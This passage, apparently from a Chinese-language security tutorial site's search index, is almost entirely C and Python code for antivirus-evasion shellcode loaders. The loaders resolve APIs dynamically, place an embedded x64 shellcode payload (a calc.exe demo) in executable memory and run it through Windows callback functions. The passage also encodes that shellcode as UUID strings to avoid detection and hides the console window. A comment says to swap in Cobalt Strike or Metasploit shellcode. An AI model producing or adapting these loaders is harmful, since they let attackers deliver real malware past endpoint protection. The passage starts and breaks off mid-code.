lpThreadAttributes, // SD\n  SIZE_T dwStackSize, //initial stack size\n  LPTHREAD_START_ROUTINE lpStartAddress, // threadfunction\n  LPVOID lpParameter, // threadargument\n  DWORD dwCreationFlags, // creation option\n  LPDWORD lpThreadId // thread identifier\n  );\n// WaitForSingleObject\ntypedef DWORD(WINAPI* dwWaitForSingleObject)(\n  HANDLE hHandle, // handle to object\n  DWORD dwMilliseconds // time-out interval\n  );\n// RtlMoveMemory\ntypedef VOID(WINAPI* vRtlMoveMemory)(\n  IN VOID UNALIGNED* Destination,\n  IN CONST VOID UNALIGNED* Source,\n  IN SIZE_T Length\n  );\nint main() {\n  // \u83b7\u53d6\u51fd\u6570\u5730\u5740\u5e76\u8d4b\u503c\u7ed9\u5bf9\u5e94\u7533\u660e\u7684\u51fd\u6570\n  hCreateThread myCT = (hCreateThread)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"),\n    \"CreateThread\");\n  lpVirtualAlloc myVA = (lpVirtualAlloc)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"),\n    \"VirtualAlloc\");\n  dwWaitForSingleObject myWFSO =\n    (dwWaitForSingleObject)GetProcAddress(GetModuleHandle(L\"kernel32.dll\"),\n      \"WaitForSingleObject\");\n  vRtlMoveMemory mymemmove =\n    (vRtlMoveMemory)GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"RtlMoveMemory\");\n  unsigned char buf[] =  \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n  // \u7533\u8bf7\u5185\u5b58\n  LPVOID lpVA = myVA(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n  // \u62f7\u8d1d\u6570\u636e\u5230\u5185\u5b58\n  mymemmove(lpVA, buf, sizeof(buf));\n  // \u521b\u5efa\u7ebf\u7a0b\n  HANDLE hThread = myCT(\n    NULL,\n    NULL,\n    (LPTHREAD_START_ROUTINE)lpVA,\n    NULL,\n    NULL,\n    0\n  );\n  // \u7b49\u5f85\u7ebf\u7a0b\u8fd0\u884c\n  myWFSO(hThread, -1);\n  // \u5173\u95ed\u7ebf\u7a0b\n  CloseHandle(hThread);\n  return 0;\n}\n</code></pre> <p></p> <p>\u8865\u5145, \u52a8\u6001\u8c03\u7528\u56de\u8c03\u51fd\u6570\u8fd0\u884cshellcode</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\ntypedef BOOL(WINAPI* lpEnumDateFormatsA)(\n  DATEFMT_ENUMPROCA lpDateFmtEnumProc,\n  LCID Locale,\n  DWORD dwFlags\n  );\ntypedef BOOL(WINAPI* lpVirtualProtect)(\n  LPVOID lpAddress,\n  SIZE_T dwSize,\n  DWORD flNewProtect,\n  PDWORD lpflOldProtect\n  );\nint main() {\n  // \u83b7\u53d6\u51fd\u6570\u5730\u5740\u5e76\u8d4b\u503c\u7ed9\u5bf9\u5e94\u7533\u660e\u7684\u51fd\u6570\n  lpVirtualProtect myVp =\n    (lpVirtualProtect)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \"VirtualProtect\");\n  lpEnumDateFormatsA myEn =\n    (lpEnumDateFormatsA)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"),\n      \"EnumDateFormatsA\");\n  unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n  DWORD oldProtect = 0;\n  // \u4fee\u6539\u6570\u636e\u5185\u5b58\u5c5e\u6027\u4e3a\u53ef\u6267\u884c\n  myVp(buf, sizeof(buf), PAGE_EXECUTE_READWRITE, &amp;oldProtect);\n  myEn((DATEFMT_ENUMPROCA)&amp;buf, NULL, NULL);\n  return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#9shellcode","title":"9.\u8865\u5145shellcode\u5904\u7406","text":"<p>\u5c31\u662f\u628ashellcode\u5904\u7406\u6210\u4e0d\u540c\u7684\u5b57\u7b26\u4e32, \u5728\u8c03\u7528\u5bf9\u5e94\u7684\u51fd\u6570\u8f6c\u621016\u8fdb\u5236\u5b57\u7b26\u4e32\u5728\u5185\u5b58\u4e2d, \u7136\u540e\u8c03\u7528\u6267\u884c</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#91uuid","title":"9.1uuid","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#uuid","title":"\u4ec0\u4e48\u662fUUID","text":"<p>UUID\uff08Universally Unique Identifier\uff0c\u901a\u7528\u552f\u4e00\u8bc6\u522b\u7801\uff09\u662f\u4e00\u79cd\u4e3a\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u5bf9\u8c61\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u6807\u8bc6\u7b26\u7684\u8f6f\u4ef6\u6784\u5efa\u5757\u3002UUID \u662f 128 \u4f4d\u7684\u6570\u5b57\uff0c\u901a\u5e38\u7531 32 \u4e2a\u5341\u516d\u8fdb\u5236(16\u4e2a\u5b57\u8282)\u6570\u5b57\u8868\u793a\uff0c\u5e76\u7531\u8fde\u5b57\u7b26\u5206\u9694\u6210\u4e94\u4e2a\u90e8\u5206\uff0c\u5f62\u5f0f\u4e3a 8-4-4-4-12\u3002\u4f8b\u5982\uff1a</p> <pre><code>550e8400-e29b-41d4-a716-446655440000\n</code></pre> <p>UUID \u7684\u76ee\u7684\u662f\u5728\u6ca1\u6709\u4e2d\u592e\u534f\u8c03\u673a\u6784\u7684\u60c5\u51b5\u4e0b\uff0c\u80fd\u591f\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u751f\u6210\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u8fd9\u610f\u5473\u7740\uff0c\u4efb\u4f55\u4eba\u5728\u4efb\u4f55\u5730\u65b9\u90fd\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a UUID\uff0c\u800c\u65e0\u9700\u62c5\u5fc3\u4e0e\u5176\u4ed6\u4eba\u521b\u5efa\u7684 UUID \u51b2\u7a81\u3002UUID \u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u4eec\u7684\u5168\u5c40\u552f\u4e00\u6027\u975e\u5e38\u9ad8\uff0c\u5373\u4f7f\u5728\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u548c\u7f51\u7edc\u4e2d\u4e5f\u80fd\u4fdd\u6301\u552f\u4e00\u6027\u3002</p> <p>UUID \u901a\u5e38\u7528\u4e8e\u4ee5\u4e0b\u573a\u666f\uff1a</p> <ul> <li>\u6570\u636e\u5e93\u4e2d\u7684\u4e3b\u952e\uff1a\u7528 UUID \u4f5c\u4e3a\u6570\u636e\u5e93\u8868\u7684\u4e3b\u952e\uff0c\u786e\u4fdd\u6bcf\u4e2a\u8bb0\u5f55\u90fd\u5177\u6709\u552f\u4e00\u7684\u6807\u8bc6\u7b26\uff0c\u907f\u514d\u6570\u636e\u51b2\u7a81\u3002</li> <li>\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u7684\u5bf9\u8c61\u6807\u8bc6\u7b26\uff1a\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\uff0c\u7531\u4e8e\u7cfb\u7edf\u7ec4\u4ef6\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u6216\u7f51\u7edc\u4e0a\uff0c\u4f7f\u7528 UUID \u4f5c\u4e3a\u5bf9\u8c61\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u6709\u52a9\u4e8e\u786e\u4fdd\u552f\u4e00\u6027\u3002</li> <li>\u4f1a\u8bdd\u6807\u8bc6\u7b26\uff1a\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u4f7f\u7528 UUID \u4f5c\u4e3a\u4f1a\u8bdd\u6807\u8bc6\u7b26\u53ef\u4ee5\u786e\u4fdd\u6bcf\u4e2a\u4f1a\u8bdd\u90fd\u6709\u552f\u4e00\u7684\u8bc6\u522b\u7801\u3002</li> <li>\u4e34\u65f6\u6587\u4ef6\u540d\uff1a\u5f53\u9700\u8981\u521b\u5efa\u4e34\u65f6\u6587\u4ef6\u65f6\uff0c\u4f7f\u7528 UUID \u4f5c\u4e3a\u6587\u4ef6\u540d\u53ef\u4ee5\u786e\u4fdd\u4e0d\u4f1a\u4e0e\u73b0\u6709\u6587\u4ef6\u51b2\u7a81\u3002</li> </ul>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#guid","title":"\u4ec0\u4e48\u662fGUID","text":"<p>GUID\uff08Globally Unique Identifier\uff0c\u5168\u5c40\u552f\u4e00\u6807\u8bc6\u7b26\uff09\u662f\u4e00\u4e2a 128 \u4f4d\u957f\u7684\u6570\u5b57\uff0c\u7528\u4e8e\u5728\u8f6f\u4ef6\u4e2d\u4e3a\u5bf9\u8c61\u5206\u914d\u552f\u4e00\u7684\u6807\u8bc6\u7b26\u3002GUID \u548c UUID\uff08Universally Unique Identifier\uff09\u57fa\u672c\u4e0a\u662f\u76f8\u540c\u7684\u6982\u5ff5\uff0c\u53ea\u662f\u672f\u8bed\u4e0a\u7684\u5dee\u522b\u3002\u5b9e\u9645\u4e0a\uff0cGUID \u662f UUID \u7684\u4e00\u79cd\u5b9e\u73b0\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#shellcodeuuid","title":"shellcode\u8f6cuuid","text":"<p>\u8fd9\u6bb5\u4ee3\u7801\u9996\u5148\u5c06\u5305\u542b shellcode \u7684\u5b57\u8282\u6570\u7ec4\u8fdb\u884c\u5904\u7406\uff0c\u786e\u4fdd\u957f\u5ea6\u662f 16 \u7684\u500d\u6570\u3002\u7136\u540e\uff0c\u5c06 shellcode \u5206\u4e3a 16 \u5b57\u8282\u7684\u5757\uff0c\u5e76\u4e3a\u6bcf\u4e2a\u5757\u521b\u5efa\u4e00\u4e2a UUID\uff0c\u5c06\u8fd9\u4e9b UUID \u5b58\u50a8\u5728\u4e00\u4e2a\u5217\u8868\u4e2d\u3002\u6700\u540e\uff0c\u5c06\u8fd9\u4e9b UUID \u4ee5 C \u8bed\u8a00\u6570\u7ec4\u7684\u5f62\u5f0f\u8f93\u51fa</p> <p>shellcode_to_uuid.py:</p> <pre><code>import uuid\n\n#\u4f7f\u7528cs\u6216msf\u751f\u6210\u7684python\u7c7b\u578b\u7684shellcode\n#shellcode = b\"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x64\\x8b\\x52\"\nshellcode = b\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n\n\n# \u7528\u4e8e\u5b58\u653eshellcode\u8f6c\u6362\u6210\u7684uuid\nuuid_list = []\n\n# \u786e\u4fdd shellcode \u957f\u5ea6\u662f 16 \u7684\u500d\u6570\uff0c\u7528 NOPs (\\x90) \u8fdb\u884c\u586b\u5145\nif len(shellcode) % 16 != 0:\n    shellcode += b'\\x90' * (16 - len(shellcode) % 16)\n\n# \u6bcf16\u5b57\u8282\u4e3a\u4e00\u7ec4\uff0c\u904d\u5386 shellcode\nfor i in range(0, len(shellcode), 16):\n    chunk = shellcode[i:i + 16]\n    # \u4e3a\u6bcf\u7ec4\u521b\u5efa\u4e00\u4e2a UUID\uff08GUID\uff09\n    uuid_chunk = uuid.UUID(bytes_le=chunk)\n    uuid_list.append(str(uuid_chunk))\n\n#\u8f93\u51fauuid\u7684c\u8bed\u8a00\u6570\u7ec4\u5f62\u5f0f\nuuids = \"const char* uuids[] = {\"\nfor uuid in uuid_list:\n    uuids = uuids + f\"\\\"{uuid}\\\",\"\nuuids = uuids[:-1] + \"};\"\nprint(uuids)\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#uuidshellcode","title":"uuid\u5199\u5165shellcode","text":"<p>\u4ee5\u4e0b\u4ee3\u7801\u7684\u4e3b\u8981\u76ee\u7684\u662f\u901a\u8fc7UUID\u52a0\u8f7d\u5e76\u6267\u884cshellcode\u3002\u4ee3\u7801\u7684\u5173\u952e\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>\u5b9a\u4e49\u4e00\u4e2a\u5305\u542b\u8f6c\u6362\u4e3aUUID\u5f62\u5f0f\u7684shellcode\u5b57\u7b26\u4e32\u6570\u7ec4 <code>uuids</code> \u3002</li> <li>\u521b\u5efa\u4e00\u4e2a\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u5806 <code>hc</code> \u3002</li> <li>\u5728\u5806\u4e0a\u5206\u914d\u4e00\u5757\u53ef\u6267\u884c\u5185\u5b58 <code>buffer</code> \u3002</li> <li>\u68c0\u67e5\u5185\u5b58\u5206\u914d\u662f\u5426\u6210\u529f\uff0c\u5982\u679c\u5931\u8d25\u5219\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u5e76\u8fd4\u56de\u3002</li> <li>\u5c06UUID\u503c\u8f6c\u6362\u56de\u539f\u59cb\u7684shellcode\u5e76\u5c06\u5176\u5b58\u50a8\u5728 <code>buffer_backup</code> \u5730\u5740\u3002</li> <li>\u4f7f\u7528<code>EnumSystemLocalesA</code>\u51fd\u6570\u8c03\u7528\u8f6c\u6362\u56de\u7684shellcode\u3002\u8fd9\u662f\u901a\u8fc7\u5c06shellcode\u4f5c\u4e3a\u5904\u7406\u6bcf\u4e2a\u679a \u4e3e\u5230\u7684\u533a\u57df\u8bbe\u7f6e\u4fe1\u606f\u7684\u56de\u8c03\u51fd\u6570\u7684\u5730\u5740\u4f20\u9012\u7ed9 <code>EnumSystemLocalesA</code> \u51fd\u6570\u5b9e\u73b0\u7684\u3002</li> <li>\u5173\u95ed\u5185\u5b58\u53e5\u67c4\u3002</li> </ol> <pre><code>#include&lt;Windows.h&gt;\n#include&lt;stdio.h&gt;\n#include &lt;Rpc.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n#pragma comment(lib, \"Rpcrt4.lib\")\n//\u7528\u4e8e\u5b58\u653eshellcode\u8f6c\u7684uuid\u7684\u6570\u7ec4\nconst char* uuids[] = {\"e48348fc-e8f0-00c0-0000-415141505251\",\"d2314856-4865-528b-6048-8b5218488b52\",\"728b4820-4850-b70f-4a4a-4d31c94831c0\",\"7c613cac-2c02-4120-c1c9-0d4101c1e2ed\",\"48514152-528b-8b20-423c-4801d08b8088\",\"48000000-c085-6774-4801-d0508b481844\",\"4920408b-d001-56e3-48ff-c9418b348848\",\"314dd601-48c9-c031-ac41-c1c90d4101c1\",\"f175e038-034c-244c-0845-39d175d85844\",\"4924408b-d001-4166-8b0c-48448b401c49\",\"8b41d001-8804-0148-d041-5841585e595a\",\"59415841-5a41-8348-ec20-4152ffe05841\",\"8b485a59-e912-ff57-ffff-5d48ba010000\",\"00000000-4800-8d8d-0101-000041ba318b\",\"d5ff876f-f0bb-a2b5-5641-baa695bd9dff\",\"c48348d5-3c28-7c06-0a80-fbe07505bb47\",\"6a6f7213-5900-8941-daff-d563616c632e\",\"00657865-9090-9090-9090-909090909090\"};\nvoid main() {\n// \u521b\u5efa\u4e00\u4e2a\u5177\u6709\u6267\u884c\u6743\u9650\u7684\u5806\nHANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\n// \u5728\u5806\u4e0a\u5206\u914d\u4e00\u5757\u53ef\u6267\u884c\u5185\u5b58\nvoid* buffer = HeapAlloc(hc, 0, 0x100000);\n// \u68c0\u67e5\u5185\u5b58\u5206\u914d\u662f\u5426\u6210\u529f\uff0c\u5982\u679c\u5931\u8d25\u5219\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u5e76\u8fd4\u56de0\nif (buffer == NULL) {\nreturn;\n }\n// uuid\u7684\u5904\u7406\nPBYTE buffer_backup = (PBYTE)buffer; //\u5b9a\u4e49\u4e00\u4e2a\u5b58\u50a8uuid\u8f6c\u6362\u6210\u7684\u4e8c\u8fdb\u5236\u5b57\u8282\u5e8f\u5217(shellcode)\n int elems = sizeof(uuids) / sizeof(uuids[0]); //\u83b7\u53d6uuid\u6570\u7ec4\u5143\u7d20\u7684\u4e2a\u6570\n /*\n UuidFromStringA\u51fd\u6570\u5c06UUID\u503c\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u5b57\u8282\u5e8f\u5217,\u5176\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b:\n RPC_STATUS UuidFromStringA(\n RPC_CSTR StringUuid, //\u6307\u5411uuid\u5f62\u5f0f\u7684\u5b57\u7b26\u4e32\u7684\u6307\u9488\n UUID * Uuid //\u7528\u4e8e\u63a5\u6536\u4e8c\u8fdb\u5236\u5b57\u8282\u5e8f\u5217\u7684\u6307\u9488\n );\n */\n // \u904d\u5386uuids\u6570\u7ec4,\u5e76\u5c06UUID\u8f6c\u6362\u56de\u539f\u59cb\u7684shellcode,\u7136\u540e\u5b58\u50a8\u5728buffer_backup\u5730\u5740\n for (int i = 0; i &lt; elems; i++) {\n  RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)buffer_backup);\n  if (status != RPC_S_OK) {\n   CloseHandle(buffer);\n   return;\n  }\n  buffer_backup += 16;\n }\n /*\n EnumSystemLocalesA\u51fd\u6570\u7528\u4e8e\u679a\u4e3e\u7cfb\u7edf\u4e2d\u652f\u6301\u7684\u6240\u6709\u533a\u57df\u8bbe\u7f6e,\u5176\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b:\n BOOL EnumSystemLocalesA(\n LOCALE_ENUMPROCA lpLocaleEnumProc, //\u5904\u7406\u6bcf\u4e2a\u679a\u4e3e\u5230\u7684\u533a\u57df\u8bbe\u7f6e\u4fe1\u606f\u7684\u56de\u8c03\u51fd\u6570\u7684\u5730\u5740\n DWORD dwFlags //\u6307\u5b9a\u679a\u4e3e\u7684\u65b9\u5f0f\n );\n */\n // \u4f7f\u7528 EnumSystemLocalesA \u51fd\u6570\u8c03\u7528\u8f6c\u6362\u56de\u7684 shellcode\n EnumSystemLocalesA((LOCALE_ENUMPROCA)buffer, 0);\n // \u5173\u95ed\u5185\u5b58\u53e5\u67c4\n CloseHandle(buffer);\n}\n</code></pre> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_6","title":"\u76f4\u63a5\u4f7f\u7528\u56de\u8c03\u51fd\u6570\u6267\u884c","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#pragma comment(lib, \"Rpcrt4.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\nusing namespace std;\nint main() {\n const char* buf[] = { \"e48348fc-e8f0-00c8-0000-415141505251\"};\n // \u8bfb\u5199\n LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf) * 16, MEM_COMMIT,\n PAGE_READWRITE);\n    // uuid\u8f6c\u6210\u4e4b\u524d\u683c\u5f0f\u7684sc\n    DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n    int init = sizeof(buf) / sizeof(buf[0]);\n    for (int i = 0; i &lt; init; i++) {\n        RPC_STATUS STATUS = UuidFromStringA((RPC_CSTR)buf[i], (UUID*)ptr);\n        if (!NT_SUCCESS(STATUS)) {\n            printf(\"[!] RtlEthernetStringToAddressA failed in %s result %x (%u)\", buf[i], STATUS,\n            GetLastError());\n            return FALSE;\n        }\n        ptr += 16;\n    }\n    // \u4fee\u6539\u5185\u5b58\u5c5e\u6027\n    DWORD pflOldProtect = 0;\n    // \u53ef\u4ee5\u6267\u884c\u7684\u5c5e\u6027\n    VirtualProtect(alloc_mem, sizeof(buf) * 16, PAGE_EXECUTE, &amp;pflOldProtect);\n    // \u56de\u8c03\u51fd\u6570\u6267\u884c\n    EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n    return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#api","title":"\u52a8\u6001\u8c03\u7528api","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#pragma comment(lib, \"Rpcrt4.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\ntypedef BOOL(WINAPI* lpEnumDateFormatsA)(\nDATEFMT_ENUMPROCA lpDateFmtEnumProc,\nLCID Locale,\nDWORD dwFlags\n );\ntypedef BOOL(WINAPI* lpVirtualProtect)(\nLPVOID lpAddress,\nSIZE_T dwSize,\nDWORD flNewProtect,\nPDWORD lpflOldProtect\n );\ntypedef LPVOID(WINAPI* lpVirtualAlloc)(\nLPVOID lpAddress,\nSIZE_T dwSize,\nDWORD flAllocationType,\nDWORD flProtect\n );\nint main() {\n const char* buf[] = { \"e48348fc-e8f0-00c8-0000-415141505251\" };\n // \u83b7\u53d6\u51fd\u6570\u5730\u5740\u5e76\u8d4b\u503c\u7ed9\u5bf9\u5e94\u7533\u660e\u7684\u51fd\u6570\n lpVirtualAlloc myVl= (lpVirtualAlloc)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \n \"VirtualAlloc\");\n lpVirtualProtect myVp =\n (lpVirtualProtect)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \"VirtualProtect\");\n lpEnumDateFormatsA myEn =\n (lpEnumDateFormatsA)GetProcAddress(GetModuleHandle(L\"Kernel32.dll\"), \n \"EnumDateFormatsA\");\n LPVOID alloc_mem = myVl(NULL, sizeof(buf) * 16, MEM_COMMIT, PAGE_READWRITE);\n // uuid\u8f6c\u6210\u4e4b\u524d\u683c\u5f0f\u7684sc\n DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n int init = sizeof(buf) / sizeof(buf[0]);\n for (int i = 0; i &lt; init; i++) {\n  RPC_STATUS STATUS = UuidFromStringA((RPC_CSTR)buf[i], (UUID*)ptr);\n  if 